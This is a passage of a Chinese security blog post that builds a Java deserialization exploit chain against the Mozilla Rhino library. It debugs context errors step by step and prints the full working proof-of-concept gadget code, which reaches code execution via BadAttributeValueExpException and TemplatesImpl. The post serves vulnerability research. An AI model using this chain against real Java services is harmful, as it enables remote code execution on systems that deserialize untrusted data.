nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">      method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译运行。呃，序列化成功，可是反序列化的时候却没看到计算器，只看到了报错：“No Context associated with current Thread”。</p>
+<p><img src="/image/39-Error-no-context.png" alt="Error-no-context"></p>
+<p><strong>报错原因：</strong></p>
+<p>问题在哪里呢？就在 <code>ScriptableObject.getImpl()</code> 的 else 分支中。</p>
+<p><img src="/image/40-Reason-no-context.png" alt="Reason-no-context"></p>
+<p>我们期望进入 2024 行的 <code>f.call()</code>，结果在 2023 行 <code>Context.getContext()</code> 抛出了异常，因为 Context 对象为空。</p>
+<p><img src="/image/41-Reason-Context-null.png" alt="Reason-Context-null"></p>
+<p>构造 <code>Context</code> 需要调用 <code>Context.enter()</code> 函数。</p>
+<p><img src="/image/42-Context-enter.png" alt="Context-enter"><br><img src="/image/43-Context-enter-2.png" alt="Context-enter-2"></p>
+<p>怎样在反序列化的时候插入 <code>Context.enter()</code> 的调用呢？</p>
+<p>重新看下调用栈，发现 <code>NativeError.js_toString()</code> 调用了两次 <code>getString()</code> 函数，分别传入字符串 “name”和“message”。</p>
+<p><img src="/image/02-js_toString.png" alt="NativeError.js_toString"> </p>
+<p>因此，我们可以把 <code>TemplatesImpl.getOutputProperties()</code> 作为 “message”的属性，把 <code>Context.enter()</code> 作为 “name” 的属性，这样就可以先执行 <code>Context.enter()</code>，再执行  <code>TemplatesImpl.getOutputProperties()</code> 进行 Payload 执行。</p>
+<p><strong>解决方案：</strong></p>
+<p>按照 POC 中设置 <code>TemplatesImpl.getOutputProperties()</code> 的方法，设置 <code>Context.enter()</code> 为 “name” 属性，将 <code>TemplatesImpl.getOutputProperties()</code> 设置为 “message” 属性</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line"><span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line"><span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123; </span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"messsage"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4、执行POC仍然失败：No-Context"><a href="#4、执行POC仍然失败：No-Context" class="headerlink" title="4、执行POC仍然失败：No Context"></a>4、执行POC仍然失败：No Context</h3><p>增加 <code>Context.enter()</code> 的调用之后，重新运行POC，呃，问题依旧……</p>
+<p><img src="/image/44-Error-no-context.png" alt="Error-no-context"></p>
+<p><strong>报错原因：</strong></p>
+<p>为什么新增的调用无效呢？因为设置函数的方法错了。</p>
+<p>无论是 <code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code> ，我们都是通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置。而这个函数设置的 <code>getter</code> 属性，是 <code>Callable</code> 类型的。</p>
+<p><img src="/image/45-ScriptalbeObject-setGetterOrSetter.png" alt="ScriptalbeObject-setGetterOrSetter"></p>
+<p>回到报错的地方看。 2009 行 if 分支的判断条件是，<code>getter</code> 属性的值必须是 <code>MemberBox</code> 类型，而 <code>MemberBox</code> 并没有实现 <code>Callable</code> 接口，所以无论进来的是<code>TemplatesImpl.getOutputProperties()</code> 还是 <code>Context.enter()</code>，代码流程都会走到 2021 行的 else 分支中。</p>
+<p><img src="/image/40-Reason-no-context.png" alt="Reason-no-context"></p>
+<p>我们期望流程走到 2024 行的 <code>f.call()</code>，遇到的问题是在 2023 行就报错了。我们增加 <code>Context.enter()</code> 的调用，期望他能解决无法通过 <code>f.call()</code> 来调用<code>TemplatesImpl.getOutputProperties()</code> 的问题。</p>
+<p>但是对 <code>Context.enter()</code> 的调用遇到了一样的问题，在 2023 行就抛出了异常，无法走到 2024 行去执行我们期望的函数。</p>
+<p>所以，对 <code>Context.enter()</code> 的设置，就不能像 <code>TemplatesImpl.getOutputProperties()</code> 一样，去通过 <code>ScriptableObject.setGetterOrSetter()</code> 函数进行设置，只能让他通过 2009 行的 if 分支去调用。但是要怎么去设置呢？ysoserial 通过反射进行强制设置 <code>getter</code> 属性来解决这个问题。</p>
+<p><strong>解决方案：</strong></p>
+<p>参考 ysoserial 中的方法，通过反射进行强制设置 <code>getter</code> 属性为 MemberBox 对象的 <code>Context.enter()</code> 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line"><span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line"><span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line"><span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line"><span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">&#123;</span><br><span class="line">    NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">    Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">    method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">&#123;</span><br><span class="line">    Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">    getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">    getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">    Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">    memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">    getter.set(slot, memberboxes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>现在再执行 POC，终于可以看到计算器了。</p>
+<p><img src="/image/46-calc.png" alt="calc"></p>
+<h2 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h2><p>完整POC参见 <a href="https://github.com/yaojieno1/rhinoPoc" target="_blank" rel="noopener">Github</a>。</p>
+<p>主要函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">generate_Object</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//构造 NativeError 对象 a</span></span><br><span class="line">    Object nativeError;</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; cls = Class.forName(<span class="string">"org.mozilla.javascript.NativeError"</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = cls.getDeclaredConstructor();</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nativeError = cons.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 NativeJavaObject 对象 o</span></span><br><span class="line">    <span class="comment">//设置 o 的成员变量 javaObject 为目标对象</span></span><br><span class="line">    <span class="comment">//设置 a 的成员变量 prototypeObject 为 o</span></span><br><span class="line">    TemplatesImpl templatesImpl = TemplatesImplGadget.get();</span><br><span class="line">    &#123;</span><br><span class="line">        Context context = Context.enter();</span><br><span class="line">        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();</span><br><span class="line">        NativeJavaObject nativeJavaObject = <span class="keyword">new</span> NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setPrototype"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Scriptable.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;nativeJavaObject&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m</span></span><br><span class="line">    <span class="comment">//设置 m 的成员变量 memberObject 为目标函数</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n</span></span><br><span class="line">    <span class="comment">//设置 n 的成员变量 methods 的 0 号元素为 m   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n</span></span><br><span class="line">    Method getOutputProperties = templatesImpl.getClass().getMethod(<span class="string">"getOutputProperties"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123; </span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(getOutputProperties, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"message"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造 MemberBox 对象 m2</span></span><br><span class="line">    <span class="comment">//设置 m2 的成员变量 memberObject 为 Context.enter()</span></span><br><span class="line">    <span class="comment">//构造 NativeJavaMethod 对象 n2</span></span><br><span class="line">    <span class="comment">//设置 n2 的成员变量 methods 的 0 号元素为 m2   </span></span><br><span class="line">    <span class="comment">//通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2</span></span><br><span class="line">    Method enterMethod = Context.class.getMethod(<span class="string">"enter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[<span class="number">0</span>]);</span><br><span class="line">    &#123;</span><br><span class="line">        NativeJavaMethod nativeJavaFunction = <span class="keyword">new</span> NativeJavaMethod(enterMethod, <span class="keyword">null</span>);</span><br><span class="line">        Method method = nativeError.getClass().getMethod(<span class="string">"setGetterOrSetter"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, Callable.class, <span class="keyword">boolean</span>.class&#125;);</span><br><span class="line">        method.invoke(nativeError, <span class="keyword">new</span> Object[]&#123;<span class="string">"name"</span>, <span class="number">0</span>, nativeJavaFunction, <span class="keyword">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数</span></span><br><span class="line">    &#123;</span><br><span class="line">        Method getSlot = ScriptableObject.class.getDeclaredMethod(<span class="string">"getSlot"</span>, <span class="keyword">new</span> Class&lt;?&gt;[]&#123;String.class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">        getSlot.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object slot  = getSlot.invoke(nativeError, <span class="string">"name"</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        Field getter = slot.getClass().getDeclaredField(<span class="string">"getter"</span>);</span><br><span class="line">        getter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; memberboxClass = Class.forName(<span class="string">"org.mozilla.javascript.MemberBox"</span>);</span><br><span class="line">        Constructor&lt;?&gt; memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);</span><br><span class="line">        memberboxClassConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);</span><br><span class="line">        getter.set(slot, memberboxes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造 BadAttributeValueExpException 对象 b</span></span><br><span class="line">    <span class="comment">//设置 b 的成员变量 val 为 NativeError 对象 a</span></span><br><span class="line">    BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>); </span><br><span class="line">    &#123;</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException, nativeError);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用栈：</p>
+<p><img src="/image/47-call-stack.png" alt="call-stack"></p>
+<h2 id="四、心得"><a href="#四、心得" class="headerlink" title="四、心得"></a>四、心得</h2><p><strong>1、</strong> 有 <code>BadAttributeValueExpException</code> 作为反序列化的入口，<code>toString()</code> 也成为了 <code>readObject()</code> 之外的另一个反序列化攻击触发点。</p>
+<p><strong>2、</strong> 反射功能，很好很强大。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+            <a href="/tags/Mozilla-Rhino/" rel="tag"># Mozilla Rhino</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/11/fastjson反序列化漏洞POC分析/" rel="next" title="fastjson 反序列化漏洞POC分析">
+                <i class="fa fa-chevron-left"></i> fastjson 反序列化漏洞POC分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/image/0.jpeg"
+                alt="香依香偎" />
+            
+              <p class="site-author-name" itemprop="name">香依香偎</p>
+              <p class="site-description motion-element" itemprop="description">闻道解惑, 香依香偎</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yaojieno1" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yaojieno1@hotmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#零、NativeError-的继承关系"><span class="nav-number">1.</span> <span class="nav-text">零、NativeError 的继承关系</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、分析"><span class="nav-number">2.</span> <span class="nav-text">一、分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、填坑"><span class="nav-number">3.</span> <span class="nav-text">二、填坑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、NativeError-无法实例化"><span class="nav-number">3.1.</span> <span class="nav-text">1、NativeError 无法实例化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、反射实例化的-NativeError-运行失败"><span class="nav-number">3.2.</span> <span class="nav-text">2、反射实例化的 NativeError 运行失败</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、执行POC失败：No-Context"><span class="nav-number">3.3.</span> <span class="nav-text">3、执行POC失败：No Context</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、执行POC仍然失败：No-Context"><span class="nav-number">3.4.</span> <span class="nav-text">4、执行POC仍然失败：No Context</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、POC"><span class="nav-number">4.</span> <span class="nav-text">三、POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、心得"><span class="nav-number">5.</span> <span class="nav-text">四、心得</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">香依香偎</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
